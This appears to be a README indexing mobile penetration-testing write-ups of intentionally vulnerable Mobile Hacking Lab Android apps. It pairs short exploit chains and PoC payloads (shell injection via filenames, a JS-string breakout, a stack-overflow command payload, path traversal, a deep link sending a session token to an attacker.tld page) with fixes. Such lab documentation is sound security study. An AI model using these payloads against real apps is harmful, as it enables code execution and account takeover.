# Mobile & App Security Lab Writeups

A personal catalog of mobile application penetration-testing writeups from **authorized lab, CTF, and training targets** (e.g. Mobile Hacking Lab). Each entry documents the full chain — static analysis, the vulnerable code, and a reproduced proof-of-concept.

> ⚠️ **Scope & authorization.** Everything here targets deliberately vulnerable practice apps or environments I own or am explicitly authorized to test. Nothing in this repo is intended for use against systems without written permission.

---

## Index

| Target | Platform | Category | Key finding | Severity | Writeup |
|--------|----------|----------|-------------|----------|---------|
| Guess Me (`com.mobilehackinglab.guessme`) | Android | WebView / Deep Link | RCE via exported deep-link → JS bridge → `Runtime.exec()` | Critical | [REPORT-guessme.md](REPORT-guessme.md) |
| Strings (`com.mobilehackinglab.challenge`) | Android | Deep Link / Crypto / JNI | Deep-link auth bypass via hardcoded AES key + client-side date gate → native `getflag()` | High | [REPORT-strings.md](REPORT-strings.md) |
| Secure Notes (`com.mobilehackinglab.securenotes`) | Android | Content Provider / Crypto | Exported provider + guessable 4-digit PIN with all crypto material in the APK → offline brute-force of the secret | High | [REPORT-securenotes.md](REPORT-securenotes.md) |
| IOT Connect (`com.mobilehackinglab.iotconnect`) | Android | IPC / Broadcast / Crypto | Global `MASTER_ON` receiver + client-side-only guest check → any app controls all devices; master PIN recovered offline from hardcoded AES (confirmed on-device) | High | [REPORT-iotconnect.md](REPORT-iotconnect.md) |
| Cyclic Scanner (`com.mobilehackinglab.cyclicscanner`) | Android | Command Injection | Filename concatenated into `sh -c` by a 6s file scanner → OS command injection in a process holding `MANAGE_EXTERNAL_STORAGE` + `INTERNET` (confirmed on-device) | Critical | [REPORT-cyclicscanner.md](REPORT-cyclicscanner.md) |
| Config Editor (`com.mobilehackinglab.configeditor`) | Android | Insecure Deserialization | Unsafe SnakeYAML `load()` on YAML from an exported auto-loading deep link → RCE via bundled `LegacyCommandUtil` exec gadget (confirmed on-device) | Critical | [REPORT-configeditor.md](REPORT-configeditor.md) |
| Food Store (`com.mobilehackinglab.foodstore`) | Android | Broken Access Control / SQLi | Exported `MainActivity` trusts credit + Pro state from intent extras (login bypass) + SQL injection in signup `INSERT` (both confirmed on-device) | High | [REPORT-foodstore.md](REPORT-foodstore.md) |
| PostBoard (`com.mobilehackinglab.postboard`) | Android | WebView / Deep Link / Command Injection | Exported deep link → JS-string breakout in a bridged WebView (only `'` escaped) → `postCowsayMessage` bridge → `sh -c` command injection = RCE (confirmed on-device) | Critical | [REPORT-postboard.md](REPORT-postboard.md) |
| TokenBleed / Cex (`com.mobilehackinglab.exchange`) | Android | Deep Link / WebView JS-Bridge | `mhlcrypto://showPage?url=` loads any URL into a dsBridge WebView whose `getUserAuth` returns the session token to the page → token theft / account takeover (confirmed on-device) | Critical | [REPORT-tokenbleed.md](REPORT-tokenbleed.md) |
| Document Viewer (`com.mobilehackinglab.documentviewer`) | Android | Path Traversal → Native RCE | Exported PDF deep link → downloader names output from `getLastPathSegment()` (decodes `%2F`) → traversal overwrites the `System.load()`-ed `libdocviewer_pro.so` → native code execution | Critical | [REPORT-documentviewer.md](REPORT-documentviewer.md) |
| NoteKeeper (`com.mobilehackinglab.notekeeper`) | Android | Native Stack Overflow → Command Exec | Note title → JNI `parse` copies it into a 100-byte stack buffer with no bounds check, overflowing into an adjacent `system()` command buffer → arbitrary OS command execution | Critical | [REPORT-notekeeper.md](REPORT-notekeeper.md) |

---

## Guess Me — quick summary

Exported, browsable `WebviewActivity` loads an attacker-supplied URL into a WebView whose `AndroidBridge.getTime()` interface runs shell commands. The deep-link allowlist is a bypassable `endsWith("mobilehackinglab.com")` check.

```
mhl:// deep link  →  weak endsWith() URL check  →  attacker page in JS-bridged WebView
                  →  AndroidBridge.getTime()     →  Runtime.exec()  =  RCE
```

**Confirmed on emulator:** `id` executed as the app's uid (`u0_a174`, SELinux `untrusted_app`). Full chain, PoC, and the six findings are in the [writeup](REPORT-guessme.md).

---

## Strings — quick summary

The flag lives in a native function `getflag()` whose string is assembled at runtime (so `strings` won't reveal it). The exported `Activity2` gates it behind a hardcoded-AES deep-link check plus a client-side SharedPreferences date check — all defeatable since the secrets ship in the app and it's debuggable.

```
set DAD4/UUU0133 = today (run-as, debuggable)  +  AES-decrypt hardcoded CT -> "mhl_secret_1337"
  →  mhl://labs/bWhsX3NlY3JldF8xMzM3  →  Activity2 passes  →  getflag()  →  flag Toast
```

Hardcoded key `your_secret_key_1234567890123456` / IV `1234567890123456`. Full chain and PoC in the [writeup](REPORT-strings.md).

---

## Secure Notes — quick summary

A secret note is AES-encrypted and served through an **exported** content provider
(`SecretDataProvider`) with no permission. Access is gated only by a 4-digit PIN passed in the
query `selection` (`pin=NNNN`) — no rate limiting. Every crypto input (ciphertext, salt, IV,
10 000 iterations) ships in `assets/config.properties`, so the 10 000-value keyspace is exhausted
**offline**.

```
assets/config.properties (ct+salt+iv+iters)  +  PBKDF2(pin,…)/AES-CBC
  →  brute 0000–9999  →  PIN 2580  →  CTF{D1d_y0u_gu3ss_1t!1?}
```

Also queryable live on-device: `adb shell content query --uri content://com.mobilehackinglab.securenotes.secretprovider --where "pin=2580"`. Full chain and PoC in the [writeup](REPORT-securenotes.md).

---

## IOT Connect — quick summary

A smart-home app with a privileged "master switch" (turn on all devices), nominally restricted to
non-guests and gated by a PIN. Both controls are **client-side only**. The PIN is validated by
decrypting a hardcoded ciphertext with a key made from the PIN's digits → recoverable offline. The
privileged action runs in a receiver registered on the **global** broadcast bus, so any app can
trigger it directly, bypassing the UI guest check.

```
Checker: AES-ECB(hardcoded ct, key=ASCII(pin)) == "master_on"  →  brute  →  PIN 345
adb shell am broadcast -a MASTER_ON --ei key 345  →  "All devices are turned on"
```

**Confirmed on-device** (external, unprivileged `adb` broadcast with the app foregrounded → "All
devices are turned on"). Login/signup is parameterized Room — **no SQLi**. Full chain and PoC in
the [writeup](REPORT-iotconnect.md).

---

## Cyclic Scanner — quick summary

A fake "antivirus" whose foreground service walks `/sdcard` every 6 seconds and "scans" each file by
shelling out to `toybox sha1sum` — building the command by concatenating the **filename** into
`sh -c`. A file whose *name* carries shell metacharacters injects commands, which the service runs
in its own process (holding `MANAGE_EXTERNAL_STORAGE` + `INTERNET`).

```
ScanEngine: sh -c "toybox sha1sum /sdcard/<name>"   (cwd=/sdcard, name attacker-controlled)
drop /sdcard/x.sh  +  file named  $(sh x.sh)  →  RCE as the scanner app (every 6s)
```

Any app that can write a file to shared storage gets code execution in the privileged scanner — no
dangerous permissions of its own. **Confirmed on-device** (trigger file executed by the running
scan service, wrote `/sdcard/pwned.txt` as the scanner's uid). Full chain and PoC in the
[writeup](REPORT-cyclicscanner.md).

---

## Config Editor — quick summary

A YAML config viewer that parses input with SnakeYAML's default (unsafe) constructor
(`new Yaml().load()`), which honours explicit `!!<class>` type tags → arbitrary object
instantiation. The app ships an exec gadget — `LegacyCommandUtil(String)` runs
`Runtime.getRuntime().exec(command)` in its constructor — so a crafted YAML achieves RCE. The sink
is reached from an **exported, auto-loading** `VIEW` deep link (`file`/`http`/`https`,
`application/yaml`); `CopyUtil` even downloads remote YAML over HTTP(S).

```
VIEW deep link (file/http/https, application/yaml)  →  handleIntent → loadYaml
  →  new Yaml().load(evil.yaml)  →  !!…LegacyCommandUtil [sh /sdcard/x.sh]  →  Runtime.exec  =  RCE
```

**Confirmed on-device:** the VIEW-intent delivery wrote `/sdcard/pwned.txt` whose `id` shows the
**Config Editor** app's uid (`u0_a180`, `untrusted_app`), not the shell caller — code execution inside
the app. Fix: `SafeConstructor` (or a typed allow-list), and delete the gadget. Full chain and PoC in
the [writeup](REPORT-configeditor.md).

---

## Food Store — quick summary

A food-ordering app whose login is decorative. `MainActivity` is `exported="true"` and reads the
user's credit balance and Pro flag straight from **intent extras** (`USER_CREDIT`, `IS_PRO_USER`)
rather than from an authenticated session — so launching it directly skips login and grants unlimited
credits + Pro. Signup compounds it: `DBHelper.addUser` concatenates the raw username into its
`INSERT`, so a crafted username is SQL injection (e.g. self-provisioning `isPro=1` with `pwn', 'cHdu', 'eA==', 1)/*`). Passwords are
stored only Base64-encoded (reversible), and the app is `debuggable`/`allowBackup`, so the user DB
is extractable.

```
adb shell am start -n com.mobilehackinglab.foodstore/.MainActivity \
    --es USERNAME attacker --ei USER_CREDIT 999999 --ez IS_PRO_USER true --es USER_ADDRESS x
  →  main screen: Credits 999999, "Pro User", every item orderable — no login  (confirmed on-device)
```

Fix: don't trust extras — load entitlements server/session-side, set the activity non-exported;
parameterize the `INSERT`; hash passwords. Full chain and PoC in the [writeup](REPORT-foodstore.md).

---

## PostBoard — quick summary

A markdown message board in a JavaScript-enabled `WebView` with a native bridge (`WebAppInterface`).
`MainActivity` is exported with a `postboard://postmessage/<base64>` deep link whose decoded content
is concatenated into a `javascript:` URL after escaping **only** the single quote (`' → \'`). Because
the backslash isn't escaped, an injected `\')` becomes `\\')` — which closes the JS string and yields
arbitrary JavaScript in the bridged WebView. That JS calls the `postCowsayMessage` bridge method,
which runs `sh -c "<script> " + message` in `CowsayUtil.runCowsay` → OS command injection = RCE.

```
postboard://postmessage/<base64>  →  only ' escaped  →  \') breaks out of postMarkdownMessage('…')
  →  WebAppInterface.postCowsayMessage("x;<cmd>")  →  sh -c  →  RCE as the app
```

Decoded payload: `\');WebAppInterface.postCowsayMessage("x;<cmd>");//` (use double-quotes for the
inner JS so the `'`-escaping never touches it). **Confirmed on-device:** the deep link ran `id` as
the PostBoard process (`uid=u0_a183`, `untrusted_app`); since the app has no storage permission the
PoC writes to its own files dir (`id>/data/data/com.mobilehackinglab.postboard/files/pb_pwned.txt`)
and reads back with `run-as`, and you must `am force-stop` first so the link hits a fresh `onCreate`.
Fix: use `evaluateJavascript` with a proper encoder (never string-concatenate into `javascript:`),
don't shell out, and keep exec capabilities off the JS bridge. Full chain and PoC in the
[writeup](REPORT-postboard.md).

---

## TokenBleed / Cex — quick summary

A crypto-exchange app that stores its session token **correctly** (EncryptedSharedPreferences,
`allowBackup=false`, `usesCleartextTraffic=false`) but leaks it through a WebView JS bridge. Exported
`SplashActivity` forwards the `mhlcrypto://` deep link to `MainActivity`, which takes
`mhlcrypto://showPage?url=<any http(s)>` and loads that URL — **no domain allow-list** — into a
dsBridge (`wendu`/Tencent TBS) WebView that has a native `JsApi` bound. `JsApi.getUserAuth` returns
the user's auth token to *any* loaded page. So a link to an attacker page = session-token theft =
account takeover.

```
mhlcrypto://showPage?url=https://attacker.tld/steal.html   (victim logged in)
  → DWebViewActivity loads attacker page + binds JsApi
  → page: dsBridge.call("getUserAuth", r => exfil(r))   → token bleed → ATO   (confirmed on-device)
```

Fix: never return auth material over a JS bridge; allow-list the WebView origin; reject
deep-link-supplied URLs into the privileged WebView. Full chain and PoC in the
[writeup](REPORT-tokenbleed.md).

---

## Document Viewer — quick summary

A PDF viewer that, at startup, `System.load()`s an optional native library from a **writable** app
path (`filesDir/native-libraries/<abi>/libdocviewer_pro.so`) and calls into it — the slot is empty in
the Free build. Its exported `VIEW` deep link (`file`/`http`/`https` + `application/pdf`) auto-runs
`CopyUtil.copyFileFromUri`, which names the downloaded output from `uri.getLastPathSegment()`.
`getLastPathSegment()` percent-**decodes**, so a `%2F..%2F` sequence is path traversal out of
`/sdcard/Download`; the coroutine `mkdirs()` + writes attacker content anywhere the app can write —
including that native-library slot. Drop a malicious `.so`, relaunch → `System.load` + native
`initProFeatures()` = RCE in a process holding `MANAGE_EXTERNAL_STORAGE`.

```
VIEW https://host/x%2F..%2F..%2F..%2Fdata%2Fdata%2F…%2Fnative-libraries%2F<abi>%2Flibdocviewer_pro.so
  → getLastPathSegment() decodes → /data/data/<pkg>/files/native-libraries/<abi>/libdocviewer_pro.so
  → next launch: System.load() + initProFeatures()  = native RCE
```

Fix: canonicalize/contain the output path (never trust `getLastPathSegment()`); load native libs only
from the packaged read-only `lib/` via `System.loadLibrary`; validate the deep link. Full chain and
PoC in the [writeup](REPORT-documentviewer.md).

---

## NoteKeeper — quick summary

The Kotlin app is inert (in-memory notes, no storage/deep-link/WebView); all logic is in native
`libnotekeeper.so`, reached via `MainActivity.parse(String Title)`. The native `parse` copies the
note **title** byte-by-byte into a 100-byte stack buffer (`sp+0x0c`) bounded only by the
attacker-controlled `GetStringLength`, directly below a buffer (`sp+0x70`) that was preloaded with a
shell command and is then passed to `system()`. A title longer than 100 bytes overflows into that
command buffer, so title bytes `[100:]` become the command `system()` runs → arbitrary OS command
execution. No stack canary; `system()` fires mid-function when a note is added.

```
title = "A"*100 + "id>/data/data/com.mobilehackinglab.notekeeper/files/pwn"
  → parse(): copy overflows sp+0x0c into sp+0x70  → system(<your command>)  = RCE
```

(App has no storage perm, so the PoC writes its own data dir and reads back via `run-as`;
`$(date)` in the built-in command confirms a shell, so `;`/`|`/`$()`/redirects all work.) Fix: bound
the copy, remove `system()`, rebuild with `-fstack-protector-strong`. Full chain and PoC in the
[writeup](REPORT-notekeeper.md).

---

## Conventions

- One writeup per target: `REPORT-<shortname>.md`.
- Each writeup includes: target metadata, a findings summary table (ID · severity · MASVS/OWASP ref), the vulnerable code, a reproducible PoC, and impact.
- Findings are tagged against [OWASP MASVS](https://mas.owasp.org/MASVS/) where applicable.
- Add new entries to the **Index** table above.

## Toolkit

`jadx` (decompile + manifest decode) · `apktool` · `adb` · Burp Suite · Frida / Objection · MobSF · an Android emulator or rooted device.
